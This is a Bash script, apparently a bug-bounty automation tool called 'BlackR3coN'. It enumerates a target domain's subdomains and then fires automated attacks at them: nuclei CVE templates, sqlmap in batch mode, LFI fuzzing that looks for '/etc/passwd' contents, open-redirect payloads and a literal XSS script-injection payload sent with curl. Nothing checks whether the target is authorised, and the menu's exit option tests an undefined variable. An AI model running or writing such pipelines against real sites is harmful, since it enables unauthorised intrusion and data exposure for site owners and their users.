#!/bin/bash
NC='\033[0m'
RED='\033[1;38;5;196m'
GREEN='\033[1;38;5;040m'
ORANGE='\033[1;38;5;202m'
BLUE='\033[1;38;5;012m'
BLUE2='\033[1;38;5;032m'
PINK='\033[1;38;5;013m'
GRAY='\033[1;38;5;004m'
NEW='\033[1;38;5;154m'
YELLOW='\033[1;38;5;214m'
CG='\033[1;38;5;087m'
CP='\033[1;38;5;221m'
CPO='\033[1;38;5;205m'
CN='\033[1;38;5;247m'
CNC='\033[1;38;5;051m'

function bounty_recon(){
echo -e ${RED}"##################################################################"
echo -e ${CP}"        ____  _            _      ____  _____           _   _    #"                                                  
echo -e ${CP}"       | __ )| | __ _  ___| | __ |  _ \|___ /  ___ ___ | \ | |   #"                                                  
echo -e ${CP}"       |  _ \| |/ _  |/ __| |/ / | |_) | |_ \ / __/ _ \|  \| |   #"                                                 
echo -e ${CP}"       | |_) | | (_| | (__|   <  |  _ < ___) | (_| (_) | |\  |   #"                                               
echo -e ${CP}"       |____/|_|\__ _|\___|_|\_\ |_| \_\____/ \___\___/|_| |_|   #"       
echo -e ${CP}"              Automate Your Bug Bounty R3cOn                     #"                                           
echo -e ${BLUE}"              https://facebook.com/unknownclay                   #"  
echo -e ${YELLOW}"              Coded By: Machine404                               #"
echo -e ${CG}"              https://github.com/machine1337                     #"
echo -e ${RED}"################################################################## \n "
}
d=$(date +"%b-%d-%y %H:%M")

function single_recon(){
clear
bounty_recon
echo -n -e ${ORANGE}"\n[+] Enter Single domain (e.g evil.com) : " 
           read domain
mkdir -p $domain $domain/vulnerabilities $domain/vulnerabilities/cors $domain/waybackurls $domain/target_wordlist $domain/gf $domain/vulnerabilities/openredirect/ $domain/vulnerabilities/xss_scan $domain/nuclei_scan $domain/vulnerabilities/LFI $domain/vulnerabilities/sqli
echo -e ${BLUE}"\n[+] Recon Started On $d: \n"
sleep 1
echo -e ${CP}"[+] Checking Services On Target:- \n"
echo "$domain" | httpx -threads 30 -o $domain/httpx.txt
sleep 1
echo -e ${GREEN}"\n[+] Searching For Cors Misconfiguration:- "
python3 ~/tools/Corsy/corsy.py -i $domain/httpx.txt -t 15 | tee $domain/vulnerabilities/cors/cors_misconfig.txt
sleep 1
echo -e ${CPO}"\n[+] Collecting URLS:- \n"
cat $domain/httpx.txt | gau | tee $domain/waybackurls/tmp.txt
cat $domain/waybackurls/tmp.txt | egrep -v "\.woff|\.ttf|\.svg|\.eot|\.png|\.jpep|\.jpeg|\.css|\.ico|\jpg" | sed 's/:80//g;s/:443//g' | sort -u >> $domain/waybackurls/wayback.txt

rm $domain/waybackurls/tmp.txt
sleep 1
echo -e ${CNC}"\n[+] FFUF Started On URLS:- "
ffuf -c -u "FUZZ" -w $domain/waybackurls/wayback.txt -of csv -o $domain/waybackurls/valid-tmp.txt

cat $domain/waybackurls/valid-tmp.txt | grep http | awk -F "," '{print $1}'  >>  $domain/waybackurls/valid.txt

rm $domain/waybackurls/valid-tmp.txt
echo -e ${PINK}"\n[+] Generating Target Based Wordlist:- "
cat $domain/waybackurls/wayback.txt | unfurl -unique paths > $domain/target_wordlist/paths.txt
cat $domain/waybackurls/wayback.txt | unfurl -unique keys > $domain/target_wordlist/param.txt
echo -e ${BLUE}"\n[+] Gf Patterns Started on Valid URLS:- "
gf xss $domain/waybackurls/valid.txt | tee $domain/gf/xss.txt
gf ssrf $domain/waybackurls/valid.txt | tee $domain/gf/ssrf.txt
gf sqli $domain/waybackurls/valid.txt | tee $domain/gf/sql.txt
gf lfi $domain/waybackurls/valid.txt | tee $domain/gf/lfi.txt
gf ssti $domain/waybackurls/valid.txt | tee $domain/gf/ssti.txt
gf aws-keys $domain/waybackurls/valid.txt | tee $domain/gf/awskeys.txt
gf redirect $domain/waybackurls/valid.txt | tee $domain/gf/redirect.txt
cat $domain/gf/redirect.txt | sed 's/\=.*/=/' | tee $domain/gf/purered.txt
gf idor $domain/waybackurls/valid.txt | tee $domain/gf/idor.txt
echo -e ${CP}"\n [+]Nuclei Scanner Started "
cat $domain/httpx.txt | nuclei -t ~/tools/nuclei-templates/cves/ -c 50 -o $domain/nuclei_scan/cves.txt
cat $domain/httpx.txt | nuclei -t ~/tools/nuclei-templates/vulnerabilities/ -c 50 -o $domain/nuclei_scan/vulnerabilities.txt
cat $domain/httpx.txt | nuclei -t ~/tools/nuclei-templates/misconfiguration/ -c 50 -o $domain/nuclei_scan/misconfiguration.txt
cat $domain/httpx.txt | nuclei -t ~/tools/nuclei-templates/technologies/ -c 50 -o $domain/nuclei_scan/tech.txt
echo -e ${ORANGE}"\n[+] Searching For Open Redirection "
cat $domain/gf/redirect.txt | qsreplace FUZZ | tee $domain/vulnerabilities/openredirect/fuzzredirect.txt
python3 ~/tools/OpenRedireX/openredirex.py -l $domain/vulnerabilities/openredirect/fuzzredirect.txt -p ~/tools/OpenRedireX/payloads.txt --keyword FUZZ | tee $domain/vulnerabilities/openredirect/confrimopenred.txt
echo -e ${GREEN}"\n[+] Searching For XSS"
cat $domain/gf/xss.txt | kxss  | tee $domain/vulnerabilities/xss_scan/kxss.txt
cat $domain/vulnerabilities/xss_scan/kxss.txt | awk '{print $9}' | sed 's/=.*/=/' | tee $domain/vulnerabilities/xss_scan/kxss1.txt
cat $domain/vulnerabilities/xss_scan/kxss1.txt | dalfox pipe | tee $domain/vulnerabilities/xss_scan/dalfoxss.txt
cat $domain/gf/xss.txt | grep "=" | qsreplace "'><sCriPt class=khan>prompt(1)</script>" | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "'><sCriPt class=khan>prompt(1)" && echo "$host \033[0;31mVulnerable\n";done | tee $domain/vulnerabilities/xss_scan/vulnxss.txt
echo -e ${CG}"\n[+] Searching For SQL Injection"
sqlmap -m $domain/gf/sql.txt --batch --random-agent --level 1 | tee $domain/vulnerabilities/sqli/sqlmap.txt
sleep 1
echo -e ${BLUE}"\n[+] Searching For LFI VULN"
cat $domain/gf/lfi.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w ~/tools/lfipayloads.txt -of csv -o $domain/vulnerabilities/LFI/lfi.txt -t 50 -c  ; done
}

function massive_recon(){
clear
bounty_recon
echo -n -e ${BLUE2}"\n[+] Full Recon with subdomains (e.g *.example.com): "
read domain
mkdir -p $domain $domain/domain_enum $domain/final_domains $domain/takeovers $domain/vulnerabilities $domain/vulnerabilities/xss_scan $domain/vulnerabilities/sqli $domain/vulnerabilities/cors  $domain/nuclei_scan $domain/waybackurls $domain/target_wordlist $domain/gf  $domain/vulnerabilities/LFI $domain/vulnerabilities/openredirect
echo -e ${RED}"\n[+] Massive Recon Started On $d:  "
sleep 1
echo -e ${CPO}"\n[+] Crt.sh Enumeration Started:- "
curl -s https://crt.sh/\?q\=%25.$domain\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | tee $domain/domain_enum/crt.txt
echo -e ${CP}"\n[+] subfinder Enumeration Started:- "
subfinder -d $domain -o $domain/domain_enum/subfinder.txt
echo -e ${PINK}"\n[+] Assetfinder Enumeration Started:- "
assetfinder -subs-only $domain | tee $domain/domain_enum/assetfinder.txt
echo -e ${ORANGE}"\n[+] Amass Enumeration Started:- "
amass enum -passive -d $domain -o $domain/domain_enum/amass.txt
echo -e ${CN}"\n[+] Shuffledns Enumeration Started:- "
shuffledns -d $domain -w /usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt -r ~/tools/resolvers/resolver.txt -o $domain/domain_enum/shuffledns.txt
echo -e ${CP}"\n[+] Collecting All Subdomains Into Single File:- "
cat $domain/domain_enum/*.txt > $domain/domain_enum/all.txt
echo -e ${BLUE}"\n[+] Resolving All Subdomains:- "
shuffledns -d $domain -list $domain/domain_enum/all.txt -o $domain/final_domains/domains.txt -r ~/tools/resolvers/resolver.txt
echo -e ${PINK}"\n[+] Checking Services On Subdomains:- "
cat $domain/final_domains/domains.txt | httpx -threads 30 -o $domain/final_domains/httpx.txt
echo -e ${CP}"\n[+] Searching For Subdomain TakeOver:- "
subzy -hide_fails -targets $domain/domain_enum/all.txt | tee $domain/takeovers/subzy.txt
subjack -w $domain/domain_enum/all.txt -t 100 -timeout 30 -o $domain/takeovers/take.txt -ssl
echo -e ${GREEN}"\n[+] Searching For Cors Misconfiguration:- "
python3 ~/tools/Corsy/corsy.py -i $domain/final_domains/httpx.txt -t 15 | tee $domain/vulnerabilities/cors/cors_misconfig.txt
echo -e ${CP}"\n[+] Nuclei Scanner Started:- "
cat $domain/final_domains/httpx.txt | nuclei -t ~/tools/nuclei-templates/cves/ -c 50 -o $domain/nuclei_scan/cves.txt
cat $domain/final_domains/httpx.txt | nuclei -t ~/tools/nuclei-templates/vulnerabilities/ -c 50 -o $domain/nuclei_scan/vulnerabilities.txt
cat $domain/final_domains/httpx.txt | nuclei -t ~/tools/nuclei-templates/misconfiguration/ -c 50 -o $domain/nuclei_scan/misconfiguration.txt
cat $domain/final_domains/httpx.txt | nuclei -t ~/tools/nuclei-templates/technologies/ -c 50 -o $domain/nuclei_scan/tech.txt
echo -e ${CPO}"\n[+] Collecting URLS:- "
cat $domain/final_domains/domains.txt | gau | tee $domain/waybackurls/tmp.txt
cat $domain/waybackurls/tmp.txt | egrep -v "\.woff|\.ttf|\.svg|\.eot|\.png|\.jpep|\.jpeg|\.css|\.ico|\jpg" | sed 's/:80//g;s/:443//g' | sort -u >> $domain/waybackurls/wayback.txt

rm $domain/waybackurls/tmp.txt
echo -e ${CNC}"\n[+] FFUF Started On URLS:- "
ffuf -c -u "FUZZ" -w $domain/waybackurls/wayback.txt -of csv -o $domain/waybackurls/valid-tmp.txt

cat $domain/waybackurls/valid-tmp.txt | grep http | awk -F "," '{print $1}'  >>  $domain/waybackurls/valid.txt

rm $domain/waybackurls/valid-tmp.txt
echo -e ${PINK}"\n[+] Generating Target Based Wordlist:- "
cat $domain/waybackurls/wayback.txt | unfurl -unique paths > $domain/target_wordlist/paths.txt
cat $domain/waybackurls/wayback.txt | unfurl -unique keys > $domain/target_wordlist/param.txt
echo -e ${BLUE}"\n[+] Gf Patterns Started on Valid URLS:- "
gf xss $domain/waybackurls/valid.txt | tee $domain/gf/xss.txt
gf ssrf $domain/waybackurls/valid.txt | tee $domain/gf/ssrf.txt
gf sqli $domain/waybackurls/valid.txt | tee $domain/gf/sql.txt
gf lfi $domain/waybackurls/valid.txt | tee $domain/gf/lfi.txt
gf ssti $domain/waybackurls/valid.txt | tee $domain/gf/ssti.txt
gf aws-keys $domain/waybackurls/valid.txt | tee $domain/gf/awskeys.txt
gf redirect $domain/waybackurls/valid.txt | tee $domain/gf/redirect.txt
cat $domain/gf/redirect.txt | sed 's/\=.*/=/' | tee $domain/gf/purered.txt
gf idor $domain/waybackurls/valid.txt | tee $domain/gf/idor.txt
echo -e ${ORANGE}"\n[+] Searching For Open Redirection:- "
cat $domain/gf/redirect.txt | qsreplace FUZZ | tee $domain/vulnerabilities/openredirect/fuzzredirect.txt
python3 ~/tools/OpenRedireX/openredirex.py -l $domain/vulnerabilities/openredirect/fuzzredirect.txt -p ~/tools/OpenRedireX/payloads.txt --keyword FUZZ | tee $domain/vulnerabilities/openredirect/confrimopenred.txt
echo -e ${GREEN}"\n[+] Searching For XSS:- "
cat $domain/gf/xss.txt | kxss  | tee $domain/vulnerabilities/xss_scan/kxss.txt
cat $domain/vulnerabilities/xss_scan/kxss.txt | awk '{print $9}' | sed 's/=.*/=/' | tee $domain/vulnerabilities/xss_scan/kxss1.txt
cat $domain/vulnerabilities/xss_scan/kxss1.txt | dalfox pipe | tee $domain/vulnerabilities/xss_scan/dalfoxss.txt
cat $domain/gf/xss.txt | grep "=" | qsreplace "'><sCriPt class=khan>prompt(1)</script>" | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "'><sCriPt class=khan>prompt(1)" && echo "$host \033[0;31mVulnerable\n";done | tee $domain/vulnerabilities/xss_scan/vulnxss.txt

echo -e ${CG}"\n[+] Searching For SQL Injection:- "
sqlmap -m $domain/gf/sql.txt --batch --random-agent --level 1 | tee $domain/vulnerabilities/sqli/sqlmap.txt
echo -e ${BLUE}"\n[+] Searching For LFI VULN:- "
cat $domain/gf/lfi.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w ~/tools/lfipayloads.txt -of csv -o $domain/vulnerabilities/LFI/lfi.txt -t 50 -c  ; done
}
menu(){
clear
bounty_recon
echo -e -n ${YELLOW}"\n[*] Which Type of recon u want to Perform\n "
echo -e "  ${NC}[${CG}"1"${NC}]${CNC} Single Target Recon"
echo -e "   ${NC}[${CG}"2"${NC}]${CNC} Full Target Recon With Subdomains "
echo -e "   ${NC}[${CG}"3"${NC}]${CNC} Exit"
echo -n -e ${RED}"\n[+] Select: "
        read bounty_play
                if [ $bounty_play -eq 1 ]; then
                        single_recon
                elif [ $bounty_play -eq 2 ]; then
                        massive_recon
                elif [ $js_play -eq 3 ]; then
                      exit
                fi

}
menu
